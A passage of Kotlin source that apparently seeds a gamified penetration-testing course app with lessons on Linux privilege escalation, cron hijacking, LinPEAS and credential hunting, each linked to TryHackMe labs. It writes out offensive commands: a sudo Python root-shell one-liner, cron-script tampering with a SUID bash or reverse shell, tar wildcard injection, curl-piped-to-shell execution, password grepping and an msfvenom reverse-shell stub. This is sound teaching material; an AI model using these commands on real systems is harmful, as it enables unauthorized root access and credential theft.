                keyTakeaways = "• Always run `sudo -l` as your very first command upon obtaining a low-privilege shell.\n• If sudo allows running Python, Perl, or Ruby, run `sudo python -c 'import os; os.system(\"/bin/bash\")'`.\n• Wildcard `*` in sudo rules allows directory traversal escapes.",
                commandsCode = "# Inspect sudo privileges\nsudo -l\n\n# Example Python sudo root escalation\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'",
                videoTitle = "Sudo Privilege Escalation: Sudo -l to Root",
                videoUrl = "https://www.youtube.com/watch?v=0kFqG1G98k8",
                videoChannel = "TCM Security",
                videoDuration = "22m",
                readTitle = "HackTricks: Sudo Exploitation & LD_PRELOAD",
                readUrl = "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid",
                readSource = "HackTricks",
                labTitle = "Sudo Exploitation Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/linprivesc",
                labPlatform = "TryHackMe",
                labDescription = "Exploit sudo permissions and environment variables to obtain a root shell.",
                xpReward = 50
            )
            57 -> DayEntity(
                id = 57, phase = 3, dayNumber = 57,
                title = "Linux Privilege Escalation: Writable Scripts & Cron Job Hijacking",
                subtitle = "Detect scheduled cron tasks running as root, monitor process creation with pspy, and overwrite scripts.",
                concept = """
                    Cron jobs execute automated maintenance scripts at scheduled intervals as root:
                    Privilege Escalation Scenarios:
                    1. Writable Target Script:
                       If `/etc/crontab` executes `/opt/backup.sh` every 5 minutes as root, and `/opt/backup.sh` has write permissions (`chmod 777`), append `chmod +s /bin/bash` or a reverse shell to the script!
                    2. Missing Absolute Path:
                       If crontab runs `tar -czf backup.tgz *` without full path, wildcards can be abused via tar checkpoint options (`--checkpoint=1 --checkpoint-action=exec=sh exploit.sh`).
                    3. `pspy` (Process Snooping):
                       Tool that snoops `/proc` without root permissions to capture ephemeral cron jobs that execute and terminate in milliseconds.
                """.trimIndent(),
                keyTakeaways = "• `pspy` monitors Linux processes in real-time without requiring root access or system logs.\n• Check `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/`.\n• Tar wildcard injection is a classic cron exploitation technique.",
                commandsCode = "# Run pspy on target to monitor background process creation\n./pspy64 -p -i 1000\n\n# Inspect system-wide crontab\ncat /etc/crontab /etc/cron.*/*",
                videoTitle = "Linux Cron Job Privilege Escalation & Process Snooping with pspy",
                videoUrl = "https://www.youtube.com/watch?v=aG3j6H5nF3M",
                videoChannel = "IppSec",
                videoDuration = "28m",
                readTitle = "HackTricks: Cron Jobs Privilege Escalation",
                readUrl = "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs",
                readSource = "HackTricks",
                labTitle = "Cron Job PrivEsc - TryHackMe",
                labUrl = "https://tryhackme.com/room/linprivesc",
                labPlatform = "TryHackMe",
                labDescription = "Monitor cron execution with pspy and hijack a writable maintenance script.",
                xpReward = 50
            )
            58 -> DayEntity(
                id = 58, phase = 3, dayNumber = 58,
                title = "Automated Linux Enumeration with LinPEAS & LinEnum",
                subtitle = "Deploy LinPEAS scripts to highlight critical root vectors, credentials, and kernel exploits.",
                concept = """
                    Automated enumeration scripts scan hundreds of Linux misconfigurations in seconds:
                    - `LinPEAS` (Linux Privilege Escalation Awesome Script):
                      The gold standard enumeration tool. Uses colored highlighting:
                      * Red/Yellow: 95% certainty of privilege escalation vector!
                      * Red: Interesting configuration requiring investigation.
                    - What LinPEAS Checks:
                      1. OS, Kernel version, and known Dirty COW / OverlayFS exploits.
                      2. SUID/SGID binaries and capabilities (`getcap -r / 2>/dev/null`).
                      3. Writable `/etc/passwd`, `/etc/shadow`, sudoers entries.
                      4. Password hashes in history files (`.bash_history`), configuration files, and environment variables.
                      5. Internal listening network sockets (e.g. MySQL 3306 or Redis 6379 bound to localhost 127.0.0.1).
                """.trimIndent(),
                keyTakeaways = "• Red/Yellow highlights in LinPEAS output represent immediate root opportunities.\n• Never pipe curl directly into bash on a client system during strict assessments; audit the script.\n• Transfer LinPEAS using a Python HTTP server (`python3 -m http.server 8000`).",
                commandsCode = "# Serve LinPEAS from Kali and execute in target memory\n# On Kali: python3 -m http.server 8000\n# On Target:\ncurl -s 10.10.14.5:8000/linpeas.sh | sh",
                videoTitle = "LinPEAS Tutorial: Linux Privilege Escalation Made Easy",
                videoUrl = "https://www.youtube.com/watch?v=F0f5rY9UvXg",
                videoChannel = "John Hammond",
                videoDuration = "23m",
                readTitle = "PEASS-ng (Privilege Escalation Awesome Scripts Suite) Official Repo",
                readUrl = "https://github.com/carlospolop/PEASS-ng",
                readSource = "PEASS-ng",
                labTitle = "LinPEAS Practice Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/linprivesc",
                labPlatform = "TryHackMe",
                labDescription = "Execute LinPEAS, interpret color-coded output, and execute the identified root exploit.",
                xpReward = 50
            )
            59 -> DayEntity(
                id = 59, phase = 3, dayNumber = 59,
                title = "Credential Harvesting & Password Reuse on Compromised Hosts",
                subtitle = "Extract plaintext passwords from config files, `.bash_history`, browser caches, and memory.",
                concept = """
                    After gaining initial access to a host, credential hunting begins:
                    - High-Value Credential Locations:
                      * Web App Configs: `wp-config.php`, `settings.py`, `database.yml`, `.env` files.
                      * Shell Histories: `~/.bash_history`, `~/.zsh_history`, `~/.mysql_history` (often contain passwords typed in CLI commands).
                      * Backup Files: `.bak`, `.old`, `/var/backups/`.
                      * SSH Private Keys: `~/.ssh/id_rsa`, `/root/.ssh/`.
                      * Mail Spool: `/var/mail/`, `/var/spool/mail/` (password reset notifications).
                      * Memory Dumps: `gdb`, `mimikatz` (Windows), `gcore`.
                """.trimIndent(),
                keyTakeaways = "• Grep recursively for password variables: `grep -rnE 'password|db_pass|secret' /var/www/ 2>/dev/null`.\n• Always test discovered database credentials against SSH and the root user (password reuse).\n• Inspect bash history for commands executed by previous administrators.",
                commandsCode = "# Search for cleartext passwords across web application configurations\ngrep -riE 'pass|pwd|credential' /var/www/html/ 2>/dev/null\n\n# Check command history files\ncat ~/.bash_history | grep -iE 'sudo|su |pass'",
                videoTitle = "Post-Exploitation Credential Hunting on Linux",
                videoUrl = "https://www.youtube.com/watch?v=3g8uK0_x088",
                videoChannel = "TCM Security",
                videoDuration = "24m",
                readTitle = "PayloadsAllTheThings: Linux Post-Exploitation & Credential Extraction",
                readUrl = "https://github.com/swisskyrepo/PayloadsAllTheThings",
                readSource = "PayloadsAllTheThings",
                labTitle = "Linux Post-Exploitation Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/postexploitintro",
                labPlatform = "TryHackMe",
                labDescription = "Hunt for leaked credentials in configuration files and history logs.",
                xpReward = 50
            )
            60 -> DayEntity(
                id = 60, phase = 3, dayNumber = 60,
                title = "Phase 3 Exploitation Capstone: Initial Access to Root",
                subtitle = "Chain CVE research, SQL injection / Metasploit, shell stabilization, and Linux SUID root escalation.",
                concept = """
                    Congratulations on completing Phase 3: Exploitation Basics!
                    You have mastered:
                    1. Vulnerability identification with Searchsploit & CVE indices.
                    2. Metasploit Framework exploitation and MSFvenom payload creation.
                    3. Reverse shell architecture and PTY interactive stabilization.
                    4. Error-based, UNION-based, and blind SQL Injection + SQLMap.
                    5. Reflected and stored Cross-Site Scripting (XSS).
                    6. Password cracking with John the Ripper and GPU-accelerated Hashcat.
                    7. Online brute-forcing with Hydra.
                    8. Memory stack architecture and buffer overflow exploitation.
                    9. Linux privilege escalation via SUID, sudoers, and cron jobs.
                    10. Automated enumeration with LinPEAS.

                    You are now ready to begin Phase 4: Web Application Penetration Testing!
                """.trimIndent(),
                keyTakeaways = "• Chaining multiple low-severity flaws (e.g. Info Disclosure -> SQLi -> Admin Web Shell -> SUID PrivEsc) yields total system compromise.\n• Phase 4 focuses deeply on the OWASP Top 10, Burp Suite mastery, and API hacking.",
                commandsCode = "# Verify root access on capstone machine\nwhoami && id && hostname",
                videoTitle = "From Zero to Root: Full Walkthrough of a VulnHub / HackTheBox Machine",
                videoUrl = "https://www.youtube.com/watch?v=WqmsS2f_sN0",
                videoChannel = "IppSec",
                videoDuration = "45m",
                readTitle = "OWASP Testing Guide: Vulnerability Assessment to Exploitation",
                readUrl = "https://owasp.org/www-project-web-security-testing-guide/",
                readSource = "OWASP",
                labTitle = "Phase 3 Capstone Target - TryHackMe",
                labUrl = "https://tryhackme.com/room/vulnversity",
                labPlatform = "TryHackMe",
                labDescription = "Fuzz upload extension bypass, trigger reverse shell, and exploit systemctl SUID for root.",
                xpReward = 100
            )
            else -> DayEntity(
                id = dayNum, phase = 3, dayNumber = dayNum,
                title = "Exploitation Concept $dayNum", subtitle = "Advanced exploitation technique.",
                concept = "Hands-on exploitation mechanics and privilege escalation.",
                keyTakeaways = "• Verify shell.\n• Escalate privileges.", commandsCode = "msfvenom -p linux/x64/shell_reverse_tcp",
                videoTitle = "Exploit Video", videoUrl = "https://youtube.com", videoChannel = "TCM Security", videoDuration = "20m",
                readTitle = "Exploit Reference", readUrl = "https://hacktricks.xyz", readSource = "HackTricks",
                labTitle = "Exploit Lab $dayNum", labUrl = "https://tryhackme.com", labPlatform = "TryHackMe", labDescription = "Complete exploit tasks.", xpReward = 50
            )
        }
    }
}
